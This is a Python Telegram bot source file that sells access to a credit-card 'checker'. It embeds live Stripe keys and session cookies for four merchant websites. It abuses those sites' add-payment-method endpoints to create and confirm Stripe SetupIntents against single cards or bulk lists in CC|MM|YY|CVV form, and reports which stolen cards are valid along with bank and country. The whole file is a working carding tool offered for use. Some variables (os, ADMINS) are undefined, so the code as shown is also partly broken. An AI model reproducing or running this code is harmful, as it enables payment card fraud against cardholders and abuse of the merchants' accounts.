Enter#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
import time
import requests
import uuid
import threading
import hashlib
import random
from datetime import datetime, timedelta
from telebot import TeleBot, types

# =============== توكن بوت التفاعل ===============
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 8855682617
DEV = "@z_0_y2"
VERSION = "⤷ ᴠ𝟼.𝟶"
AUTHOR = "⤷ @z_0_y2"
# =============== نظام المستخدمين والكودات ===============
AUTHORIZED_USERS = [8855682617]
user_codes = {}
pending_codes = {}

# =============== البوابات الأربعة ===============
GATEWAYS = [
    {
        "name": "Stripe Auth #1",
        "stripe_key": "pk_live_51Ps3vERuauo2vgoqgy8ao06fnaQeTZ4yQhwXSMKOWXi4Mt30MX7ngj2nGM4IefvYP66TEgcm6A97yUXMDIRpBxN4009kt1eFst",
        "url": "https://my.reliabecloud.com",
        "cookies": {
            '__stripe_mid': '5606e7f7-ffad-4a87-afff-7c4bbefa1288e4fcb4',
            '__stripe_sid': '9be0b0e8-66a2-47fb-b1b9-e15b002bed59cc8101',
            'WHMCSPKhB4ecIIbla': '7e05fba0b7e930c906ce8cdb6eb060da',
        },
        "token": None,
        "client_session_id": None,
        "wallet_config_id": None,
        "setup_data": None,
        "active": True,
        "fail_count": 0,
        "last_error": None,
        "last_check": None
    },
    {
        "name": "Stripe Auth #2",
        "stripe_key": "pk_live_51PElYwIFXufYIZycRp4YJLtrPXgfPDQ3CIhexgD9ZshcwFFb37t0j5eiTHucHF9MK5x6R98OB33A9if2uVgazNLO00m6NHeph5",
        "url": "https://www.fastpanda.co.uk",
        "cookies": {
            '_currency': 'GBP',
            '__stripe_mid': 'c80e6842-8e7f-4094-bf69-b0bfad479dc3371465',
            '__stripe_sid': 'c48426b9-1b57-471a-99ea-41b61b1faf0634009f',
            'WHMCSy551iLvnhYt7': 'jfdibhghp5lknhqvg1matrrhd7',
            'WHMCSUser': '6125%3A%3A7da785e673fb9cd6a96ee730b1d3e9fc5ee1a853',
        },
        "token": None,
        "client_session_id": None,
        "wallet_config_id": None,
        "setup_data": None,
        "active": True,
        "fail_count": 0,
        "last_error": None,
        "last_check": None
    },
    {
        "name": "Stripe Auth #3",
        "stripe_key": "pk_live_51NxTgeFZsEVAL3ZKnbjGrz8S0xO6fhPvT4bt4aeooxVpo5Scvr9sBQQ24ROaDcQGBavclQgqnrNPJOuqY4rlW5ji000xb2zNt3",
        "url": "https://dashboard.proxywing.com",
        "cookies": {
            '__stripe_mid': '00c7238d-a235-4f5a-81a2-88c5ee79ddb7abcb25',
            '__stripe_sid': '8380ecbd-126c-4f1f-a242-879f55bd453c5eead6',
            'WHMCSfJ1XkWUErbVN': '9ur34qe7208kf4q92esim7dvk5',
        },
        "token": None,
        "client_session_id": None,
        "wallet_config_id": None,
        "setup_data": None,
        "active": True,
        "fail_count": 0,
        "last_error": None,
        "last_check": None
    },
    {
        "name": "Stripe Auth #4",
        "stripe_key": "pk_live_CyAsnsy8MCNVuWWHRCOmtmSb",
        "url": "https://www.bacloud.com",
        "cookies": {
            '__stripe_mid': '2150425d-64a2-4a0b-88d5-2878c850bd4e3336ea',
            '__stripe_sid': '6a0b2496-4c3c-4aa4-8a14-b6bbaa31790ea0cf3c',
            'WHMCS6gnIyj0tBZJA': 'or7eg2ni1n5mrdlrjpabqo31ol',
        },
        "token": None,
        "client_session_id": None,
        "wallet_config_id": None,
        "setup_data": None,
        "active": True,
        "fail_count": 0,
        "last_error": None,
        "last_check": None
    }
]

bot = TeleBot(BOT_TOKEN, parse_mode='HTML')
selected_gateway_index = 0
temp_files = {}

# =============== دوال نظام الكودات ===============
def is_authorized(user_id):
    if user_id in ADMINS:
        return True
    if user_id in user_codes:
        if user_codes[user_id]['expiry'] > time.time():
            return True
        else:
            del user_codes[user_id]
    return False

def generate_user_code(expiry_days):
    code = hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:12]
    pending_codes[code] = {
        'expiry': time.time() + (expiry_days * 86400),
        'created_by': ADMINS[0]
    }
    return code

def activate_user_code(user_id, code):
    if code in pending_codes:
        data = pending_codes[code]
        user_codes[user_id] = {'expiry': data['expiry']}
        del pending_codes[code]
        return True
    return False

def get_user_expiry(user_id):
    if user_id in user_codes:
        expiry = user_codes[user_id]['expiry']
        return datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S')
    return "Not registered"

# =============== دوال تحديث البوابة (مثل سورس القناة) ===============
def update_gateway(gateway):
    """تحديث البوابة والحصول على SetupIntent جديد"""
    try:
        print(f"   🔄 Updating {gateway['name']}...")
        
        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9', 
                   'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
        
        if "reliabecloud" in gateway['url']:
            url = f"{gateway['url']}/index.php?rp=/account/paymentmethods/add"
        elif "fastpanda" in gateway['url']:
            url = f"{gateway['url']}/index.php/account/paymentmethods/add"
        elif "proxywing" in gateway['url']:
            url = f"{gateway['url']}/billing/account/paymentmethods/add"
        else:
            url = f"{gateway['url']}/index.php?rp=/account/paymentmethods/add"
        
        response = requests.get(url, headers=headers, cookies=gateway["cookies"], timeout=15)
        if response.status_code != 200:
            gateway["active"] = False
            gateway["fail_count"] += 1
            gateway["last_error"] = f"HTTP {response.status_code}"
            gateway["last_check"] = datetime.now().strftime('%H:%M:%S')
            return False
        
        html = response.text
        
        token_match = re.search(r'name="token"\s+value="([a-f0-9]+)"', html)
        if not token_match:
            token_match = re.search(r'"token":"([a-f0-9]+)"', html)
        gateway["token"] = token_match.group(1) if token_match else None
        
        if not gateway["token"]:
            gateway["active"] = False
            gateway["fail_count"] += 1
            gateway["last_error"] = "Token not found"
            gateway["last_check"] = datetime.now().strftime('%H:%M:%S')
            return False
        
        cs_match = re.search(r'client_session_id["\']?\s*[:=]\s*["\']([a-f0-9-]+)["\']', html)
        gateway["client_session_id"] = cs_match.group(1) if cs_match else str(uuid.uuid4())
        
        wc_match = re.search(r'wallet_config_id["\']?\s*[:=]\s*["\']([a-f0-9-]+)["\']', html)
        gateway["wallet_config_id"] = wc_match.group(1) if wc_match else str(uuid.uuid4())
        
        headers2 = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': gateway['url'],
            'referer': url,
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = f'token={gateway["token"]}&type=token_stripe&description=&cardcvv=&bankaccttype=Checking&billingcontact=0'
        
        if "reliabecloud" in gateway['url']:
            url2 = f"{gateway['url']}/index.php?rp=/stripe/setup/intent"
        elif "fastpanda" in gateway['url']:
            url2 = f"{gateway['url']}/index.php?rp=/stripe/setup/intent"
        elif "proxywing" in gateway['url']:
            url2 = f"{gateway['url']}/billing/index.php?rp=/stripe/setup/intent"
        else:
            url2 = f"{gateway['url']}/index.php?rp=/stripe/setup/intent"
        
        response2 = requests.post(url2, headers=headers2, data=data, cookies=gateway["cookies"], timeout=15)
        result = response2.json()
        
        if 'setup_intent' in result:
            full = result['setup_intent']
            gateway["setup_data"] = {
                'id': full.split('_secret')[0],
                'secret': full
            }
            gateway["active"] = True
            gateway["fail_count"] = 0
            gateway["last_error"] = None
            gateway["last_check"] = datetime.now().strftime('%H:%M:%S')
            print(f"   ✅ {gateway['name']} Updated")
            return True
        else:
            gateway["active"] = False
            gateway["fail_count"] += 1
            gateway["last_error"] = result.get('error', {}).get('message', 'SetupIntent failed')
            gateway["last_check"] = datetime.now().strftime('%H:%M:%S')
            return False
            
    except Exception as e:
        print(f"   ❌ Failed {gateway['name']}: {e}")
        gateway["active"] = False
        gateway["fail_count"] += 1
        gateway["last_error"] = str(e)[:100]
        gateway["last_check"] = datetime.now().strftime('%H:%M:%S')
        return False

def create_fresh_setup_intent(gateway):
    """إنشاء SetupIntent جديد (مثل update_gateway ولكن يعيد البيانات)"""
    try:
        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9', 
                   'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
        
        if "reliabecloud" in gateway['url']:
            url = f"{gateway['url']}/index.php?rp=/account/paymentmethods/add"
        elif "fastpanda" in gateway['url']:
            url = f"{gateway['url']}/index.php/account/paymentmethods/add"
        elif "proxywing" in gateway['url']:
            url = f"{gateway['url']}/billing/account/paymentmethods/add"
        else:
            url = f"{gateway['url']}/index.php?rp=/account/paymentmethods/add"
        
        response = requests.get(url, headers=headers, cookies=gateway["cookies"], timeout=15)
        if response.status_code != 200:
            return None
        
        html = response.text
        
        token_match = re.search(r'name="token"\s+value="([a-f0-9]+)"', html)
        token = token_match.group(1) if token_match else None
        if not token:
            return None
        
        cs_match = re.search(r'client_session_id["\']?\s*[:=]\s*["\']([a-f0-9-]+)["\']', html)
        client_session_id = cs_match.group(1) if cs_match else str(uuid.uuid4())
        
        wc_match = re.search(r'wallet_config_id["\']?\s*[:=]\s*["\']([a-f0-9-]+)["\']', html)
        wallet_config_id = wc_match.group(1) if wc_match else str(uuid.uuid4())
        
        stripe_mid = None
        stripe_sid = None
        for cookie in requests.Session().get(url, headers=headers).cookies:
            if cookie.name == '__stripe_mid':
                stripe_mid = cookie.value
            if cookie.name == '__stripe_sid':
                stripe_sid = cookie.value
        
        headers2 = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = f'token={token}&type=token_stripe&billingcontact=0'
        
        if "reliabecloud" in gateway['url']:
            url2 = f"{gateway['url']}/index.php?rp=/stripe/setup/intent"
        elif "fastpanda" in gateway['url']:
            url2 = f"{gateway['url']}/index.php?rp=/stripe/setup/intent"
        elif "proxywing" in gateway['url']:
            url2 = f"{gateway['url']}/billing/index.php?rp=/stripe/setup/intent"
        else:
            url2 = f"{gateway['url']}/index.php?rp=/stripe/setup/intent"
        
        response2 = requests.post(url2, headers=headers2, data=data, cookies=gateway["cookies"], timeout=15)
        result = response2.json()
        
        if 'setup_intent' in result:
            full = result['setup_intent']
            return {
                'id': full.split('_secret')[0],
                'secret': full,
                'client_session_id': client_session_id,
                'wallet_config_id': wallet_config_id,
                'stripe_mid': stripe_mid or str(uuid.uuid4()),
                'stripe_sid': stripe_sid or str(uuid.uuid4()),
            }
        return None
    except Exception as e:
        print(f"   ❌ Failed to create intent: {e}")
        return None

def update_all_gateways():
    print("\n🔄 Updating all gateways...")
    for gateway in GATEWAYS:
        update_gateway(gateway)
        time.sleep(0.3)
    print("✅ All gateways updated")

# =============== فحص البطاقة (مع إنشاء SetupIntent جديد لكل بطاقة) ===============
def check_card_with_gateway(card_line, gateway):
    # إنشاء SetupIntent جديد لكل بطاقة (مثل سورس القناة)
    intent_data = create_fresh_setup_intent(gateway)
    
    if not intent_data:
        return "❌ FAILED TO CREATE INTENT"
    
    try:
        parts = card_line.split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 4:
            yy = yy[-2:]
        
        formatted_cc = ' '.join([cc[i:i+4] for i in range(0, len(cc), 4)])
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        
        data = f'payment_method_data[type]=card&payment_method_data[card][number]={formatted_cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mm.zfill(2)}&payment_method_data[card][exp_year]={yy}&payment_method_data[guid]=9cf5bb6e-4c21-4b0b-8201-f1038da56c735b2538&payment_method_data[muid]={intent_data["stripe_mid"]}&payment_method_data[sid]={intent_data["stripe_sid"]}&payment_method_data[payment_user_agent]=stripe.js%2F58c31ec645%3B+stripe-js-v3%2F58c31ec645%3B+split-card-element&payment_method_data[referrer]={gateway["url"]}&payment_method_data[time_on_page]=50000&payment_method_data[client_attribution_metadata][client_session_id]={intent_data["client_session_id"]}&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=split-card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&payment_method_data[client_attribution_metadata][wallet_config_id]={intent_data["wallet_config_id"]}&expected_payment_method_type=card&use_stripe_sdk=true&key={gateway["stripe_key"]}&client_attribution_metadata[client_session_id]={intent_data["client_session_id"]}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]={intent_data["wallet_config_id"]}&client_secret={intent_data["secret"]}'
        
        url = f'https://api.stripe.com/v1/setup_intents/{intent_data["id"]}/confirm'
        response = requests.post(url, headers=headers, data=data, timeout=8)
        result = response.json()
        
        if result.get('status') == 'succeeded':
            return "✅ APPROVED"
        elif 'error' in result:
            decline_code = result['error'].get('decline_code', '')
            decline_message = result['error'].get('message', '')
            if decline_code:
                return f"❌ DECLINED [{decline_code}]"
            elif decline_message:
                short_msg = decline_message[:40] + "..." if len(decline_message) > 40 else decline_message
                return f"❌ DECLINED [{short_msg}]"
            return "❌ DECLINED"
        return "❌ DECLINED"
        
    except Exception as e:
        return f"❌ ERROR [{str(e)[:20]}]"

def get_bin_info(bin_num):
    try:
        r = requests.get(f'https://lookup.binlist.net/{bin_num}', timeout=5)
        if r.status_code == 200:
            d = r.json()
            return {
                'bank': d.get('bank', {}).get('name', 'Unknown'),
                'country': d.get('country', {}).get('name', 'Unknown'),
                'emoji': d.get('country', {}).get('emoji', '🌍'),
                'scheme': d.get('scheme', 'Unknown'),
                'type': d.get('type', 'Unknown'),
            }
    except:
        pass
    return {'bank': 'Unknown', 'country': 'Unknown', 'emoji': '🌍', 'scheme': 'Unknown', 'type': 'Unknown'}

def extract_cards_from_text(content):
    cards = []
    for line in content.split('\n'):
        line = line.strip()
        if line and '|' in line:
            parts = line.split('|')
            if len(parts) >= 4:
                cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
                if len(yy) == 4:
                    yy = yy[-2:]
                cards.append(f"{cc}|{mm}|{yy}|{cvv}")
    return cards

# =============== أوامر البوت ===============
@bot.message_handler(commands=["start"])
def start_command(message):
    user_id = message.chat.id
    
    if user_id in ADMINS:
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("🔐 Create Code", callback_data="create_code"),
            types.InlineKeyboardButton("📊 Active Codes", callback_data="list_codes"),
            types.InlineKeyboardButton("👥 Users", callback_data="list_users")
        )
        
        bot.reply_to(message, f"""
✅ <b>Stripe Checker Bot</b>
━━━━━━━━━━━━━━━━━━━━━
👑 <b>Admin Panel</b>
━━━━━━━━━━━━━━━━━━━━━
📌 <b>Commands:</b>
/chk CC|MM|YY|CVV - Check card
/combo - Check file
/status - Gateways status
/update - Update gateways
/gateway - Select gateway
/gencode days - Create code
/activate code - Activate code
━━━━━━━━━━━━━━━━━━━━━
{VERSION} | {DEV} | {AUTHOR}
""", parse_mode='HTML', reply_markup=markup)
    elif is_authorized(user_id):
        expiry = get_user_expiry(user_id)
        bot.reply_to(message, f"""
✅ <b>Welcome</b>
━━━━━━━━━━━━━━━━━━━━━
📅 Expires: {expiry}
━━━━━━━━━━━━━━━━━━━━━
📌 <b>Commands:</b>
/chk CC|MM|YY|CVV
/combo - Check file
/status - Gateways status
/gateway - Select gateway
━━━━━━━━━━━━━━━━━━━━━
{VERSION} | {DEV} | {AUTHOR}
""", parse_mode='HTML')
    else:
        bot.reply_to(message, f"""
❌ <b>ACCESS DENIED</b>
━━━━━━━━━━━━━━━━━━━━━
Please enter activation code
━━━━━━━━━━━━━━━━━━━━━
Contact: {DEV} | {AUTHOR}
""", parse_mode='HTML')

@bot.message_handler(commands=["activate"])
def activate(message):
    user_id = message.chat.id
    code = message.text.replace('/activate ', '').strip()
    
    if activate_user_code(user_id, code):
        bot.reply_to(message, "✅ <b>Code activated successfully!</b>\nYou can now use the bot", parse_mode='HTML')
    else:
        bot.reply_to(message, "❌ <b>Invalid or expired code!</b>", parse_mode='HTML')

@bot.message_handler(commands=["gencode"])
def gen_code(message):
    user_id = message.chat.id
    if user_id not in ADMINS:
        bot.reply_to(message, "❌ ACCESS DENIED")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /gencode <days>\nExample: /gencode 30", parse_mode='HTML')
            return
        
        days = int(parts[1])
        if days <= 0:
            bot.reply_to(message, "❌ Days must be greater than 0", parse_mode='HTML')
            return
        
        code = generate_user_code(days)
        bot.reply_to(message, f"""
✅ <b>Code created!</b>
━━━━━━━━━━━━━━━━━━━━━
🔑 <code>{code}</code>
📅 {days} days
━━━━━━━━━━━━━━━━━━━━━
Send to user: <code>/activate {code}</code>
""", parse_mode='HTML')
    except ValueError:
        bot.reply_to(message, "❌ Please enter a valid number", parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == 'create_code')
def create_code_callback(call):
    if call.from_user.id not in ADMINS:
        bot.answer_callback_query(call.id, "❌ Admin only")
        return
    
    msg = bot.send_message(call.from_user.id, "📝 Enter days (example: 30):", parse_mode='HTML')
    bot.register_next_step_handler(msg, get_code_days)

def get_code_days(message):
    try:
        days = int(message.text.strip())
        if days <= 0:
            bot.send_message(message.chat.id, "❌ Days must be greater than 0", parse_mode='HTML')
            return
        
        code = generate_user_code(days)
        bot.send_message(message.chat.id, f"""
✅ <b>Code created!</b>
━━━━━━━━━━━━━━━━━━━━━
🔑 <code>{code}</code>
📅 {days} days
━━━━━━━━━━━━━━━━━━━━━
Send to user: <code>/activate {code}</code>
""", parse_mode='HTML')
    except ValueError:
        bot.send_message(message.chat.id, "❌ Please enter a valid number", parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == 'list_codes')
def list_codes_callback(call):
    if call.from_user.id not in ADMINS:
        bot.answer_callback_query(call.id, "❌ Admin only")
        return
    
    if not pending_codes:
        bot.send_message(call.from_user.id, "📭 No active codes", parse_mode='HTML')
        return
    
    msg = "📋 <b>Active codes:</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
    for code, data in pending_codes.items():
        expiry = datetime.fromtimestamp(data['expiry']).strftime('%Y-%m-%d %H:%M:%S')
        msg += f"\n🔑 <code>{code}</code>\n   📅 Expires: {expiry}\n"
    
    bot.send_message(call.from_user.id, msg, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == 'list_users')
def list_users_callback(call):
    if call.from_user.id not in ADMINS:
        bot.answer_callback_query(call.id, "❌ Admin only")
        return
    
    if not user_codes:
        bot.send_message(call.from_user.id, "📭 No active users", parse_mode='HTML')
        return
    
    msg = "👥 <b>Active users:</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
    for uid, data in user_codes.items():
        expiry = datetime.fromtimestamp(data['expiry']).strftime('%Y-%m-%d %H:%M:%S')
        msg += f"\n🆔 <code>{uid}</code>\n   📅 Expires: {expiry}\n"
    
    bot.send_message(call.from_user.id, msg, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data.startswith("gateway_"))
def gateway_callback(call):
    global selected_gateway_index
    if call.from_user.id not in ADMINS and not is_authorized(call.from_user.id):
        bot.answer_callback_query(call.id, "❌ Not authorized")
        return
    
    idx = int(call.data.split("_")[1])
    selected_gateway_index = idx
    bot.answer_callback_query(call.id, f"✅ Selected {GATEWAYS[idx]['name']}")
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    for i, g in enumerate(GATEWAYS):
        status = "✅" if g['active'] else "❌"
        marker = "👉 " if i == selected_gateway_index else ""
        markup.add(types.InlineKeyboardButton(f"{marker}{status} {g['name']}", callback_data=f"gateway_{i}"))
    
    bot.edit_message_text(f"✅ Gateway selected: {GATEWAYS[idx]['name']}\n━━━━━━━━━━━━━━━━━━━━━\nUse /chk to check card", 
                          call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("combo_gateway_"))
def combo_gateway_callback(call):
    user_id = call.from_user.id
    if user_id not in ADMINS and not is_authorized(user_id):
        bot.answer_callback_query(call.id, "❌ Not authorized")
        return
    
    idx = int(call.data.split("_")[2])
    file_id = call.data.split("_")[3]
    
    if file_id in temp_files:
        cards = temp_files[file_id]['cards']
        total = len(cards)
        
        bot.answer_callback_query(call.id, f"✅ Starting check on {GATEWAYS[idx]['name']}")
        
        status_msg = bot.edit_message_text(f"🚀 Checking {total} cards on {GATEWAYS[idx]['name']}...\n━━━━━━━━━━━━━━━━━━━━━", 
                                           call.message.chat.id, call.message.message_id)
        
        gateway = GATEWAYS[idx]
        
        approved = 0
        declined = 0
        results_list = []
        
        for i, card in enumerate(cards, 1):
            # كل بطاقة تاخذ SetupIntent جديد
            result = check_card_with_gateway(card, gateway)
            
            if "APPROVED" in result:
                approved += 1
                bin_info = get_bin_info(card.split('|')[0][:6])
                
                msg = f"""
✅ <b>VALID CARD FOUND!</b>
━━━━━━━━━━━━━━━━━━━━━
💳 <code>{card}</code>
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>{gateway['name']}</b>
📌 {result}
━━━━━━━━━━━━━━━━━━━━━
🏦 {bin_info['bank']}
🌍 {bin_info['emoji']} {bin_info['country']}
💳 {bin_info['scheme']} - {bin_info['type']}
━━━━━━━━━━━━━━━━━━━━━
⚡ {DEV} | {AUTHOR}
"""
                bot.send_message(call.message.chat.id, msg, parse_mode='HTML')
            else:
                declined += 1
                results_list.append(f"💳 <code>{card[:12]}...</code> → {result}")
            
            if i % 3 == 0 or i == total:
                recent_results = "\n".join(results_list[-6:]) if results_list else "No results yet"
                progress_text = f"""
📊 <b>Checking progress</b>
━━━━━━━━━━━━━━━━━━━━━
🔐 {gateway['name']}
📌 [{i}/{total}] | ✅ {approved} | ❌ {declined}
━━━━━━━━━━━━━━━━━━━━━
<b>Recent results:</b>
{recent_results}
"""
                try:
                    bot.edit_message_text(progress_text, call.message.chat.id, status_msg.message_id, parse_mode='HTML')
                except:
                    pass
            
            time.sleep(0.5)  # تأخير بسيط بين الطلبات
        
        final = f"""
✅ <b>Completed!</b>
━━━━━━━━━━━━━━━━━━━━━
📊 Total: {total}
✅ Approved: {approved}
❌ Declined: {declined}
🔐 Gateway: {gateway['name']}
━━━━━━━━━━━━━━━━━━━━━
⚡ {DEV} | {AUTHOR}
"""
        bot.edit_message_text(final, call.message.chat.id, status_msg.message_id, parse_mode='HTML')
        del temp_files[file_id]

@bot.message_handler(commands=["gateway"])
def gateway_command(message):
    user_id = message.chat.id
    if user_id not in ADMINS and not is_authorized(user_id):
        bot.reply_to(message, "❌ ACCESS DENIED")
        return
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    for i, g in enumerate(GATEWAYS):
        status = "✅" if g['active'] else "❌"
        marker = "👉 " if i == selected_gateway_index else ""
        markup.add(types.InlineKeyboardButton(f"{marker}{status} {g['name']}", callback_data=f"gateway_{i}"))
    
    bot.reply_to(message, "🔐 <b>Select gateway:</b>", parse_mode='HTML', reply_markup=markup)

@bot.message_handler(commands=["status"])
def status_command(message):
    user_id = message.chat.id
    if user_id not in ADMINS and not is_authorized(user_id):
        bot.reply_to(message, "❌ ACCESS DENIED")
        return
    
    status_text = "📊 <b>Gateways Status</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
    for g in GATEWAYS:
        status_text += f"{'✅' if g['active'] else '❌'} {g['name']}\n"
        if not g['active'] and g['last_error']:
            status_text += f"   ⚠️ {g['last_error']}\n"
    status_text += f"\n🔐 Selected: {GATEWAYS[selected_gateway_index]['name']}"
    
    bot.reply_to(message, status_text, parse_mode='HTML')

@bot.message_handler(commands=["update"])
def update_command(message):
    user_id = message.chat.id
    if user_id not in ADMINS and not is_authorized(user_id):
        bot.reply_to(message, "❌ ACCESS DENIED")
        return
    
    msg = bot.reply_to(message, "🔄 Updating gateways...")
    
    def update_thread():
        update_all_gateways()
        bot.edit_message_text("✅ All gateways updated", message.chat.id, msg.message_id)
    
    threading.Thread(target=update_thread, daemon=True).start()

@bot.message_handler(commands=["chk"])
def check_command(message):
    user_id = message.chat.id
    if user_id not in ADMINS and not is_authorized(user_id):
        bot.reply_to(message, "❌ ACCESS DENIED\nUse /activate <code>", parse_mode='HTML')
        return
    
    try:
        card = message.text.replace('/chk ', '').strip()
        parts = card.split('|')
        
        if len(parts) < 4:
            bot.reply_to(message, "❌ Invalid format!\nUse: /chk CC|MM|YY|CVV", parse_mode='HTML')
            return
        
        status_msg = bot.reply_to(message, "⌛ Checking...")
        
        gateway = GATEWAYS[selected_gateway_index]
        
        result = check_card_with_gateway(card, gateway)
        
        bin_info = get_bin_info(parts[0][:6])
        
        result_text = f"""
🔍 <b>Result</b>
━━━━━━━━━━━━━━━━━━━━━
💳 <code>{card}</code>
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>{gateway['name']}</b>
📌 {result}
━━━━━━━━━━━━━━━━━━━━━
🏦 {bin_info['bank']}
🌍 {bin_info['emoji']} {bin_info['country']}
💳 {bin_info['scheme']} - {bin_info['type']}
━━━━━━━━━━━━━━━━━━━━━
⚡ {DEV} | {AUTHOR}
"""
        bot.edit_message_text(result_text, message.chat.id, status_msg.message_id, parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:100]}", parse_mode='HTML')

@bot.message_handler(commands=["combo"])
def combo_command(message):
    user_id = message.chat.id
    if user_id not in ADMINS and not is_authorized(user_id):
        bot.reply_to(message, "❌ ACCESS DENIED")
        return
    
    bot.reply_to(message, """
📁 <b>Combo Check - Bulk</b>
━━━━━━━━━━━━━━━━━━━━━
Send a <b>.txt</b> file with one card per line

📝 <b>Format:</b>
<code>CC|MM|YY|CVV</code>

<b>Example:</b>
<code>4758330003566608|05|27|350</code>

⚠️ After sending, select gateway
✅ Only valid cards will be sent
✅ Fresh SetupIntent for each card
""", parse_mode='HTML')

@bot.message_handler(content_types=["document"])
def handle_combo_file(message):
    user_id = message.chat.id
    if user_id not in ADMINS and not is_authorized(user_id):
        bot.reply_to(message, "❌ ACCESS DENIED")
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        content = downloaded.decode('utf-8')
        
        cards = extract_cards_from_text(content)
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in file")
            return
        
        total = len(cards)
        file_id = str(message.message_id)
        temp_files[file_id] = {'cards': cards, 'total': total}
        
        markup = types.InlineKeyboardMarkup(row_width=1)
        for i, g in enumerate(GATEWAYS):
            status = "✅" if g['active'] else "❌"
            markup.add(types.InlineKeyboardButton(f"{status} {g['name']}", callback_data=f"combo_gateway_{i}_{file_id}"))
        
        bot.reply_to(message, f"""
📁 <b>File loaded!</b>
━━━━━━━━━━━━━━━━━━━━━
📊 Total cards: {total}
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>Select gateway:</b>
""", parse_mode='HTML', reply_markup=markup)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:100]}")

# =============== تشغيل البوت ===============
if __name__ == "__main__":
    print("=" * 50)
    print("✅ STRIPE CHECKER BOT")
    print(f"👥 Admins: {ADMINS}")
    print(f"👤 Dev: {DEV}")
    print(f"👤 Author: {AUTHOR}")
    print(f"🔐 {len(GATEWAYS)} Gateways")
    print("✅ Fresh SetupIntent for each card")
    print("✅ Code activation system")
    print("=" * 50)
    
    update_all_gateways()
    
    print("\n🚀 Bot is running...")
    bot.infinity_polling()
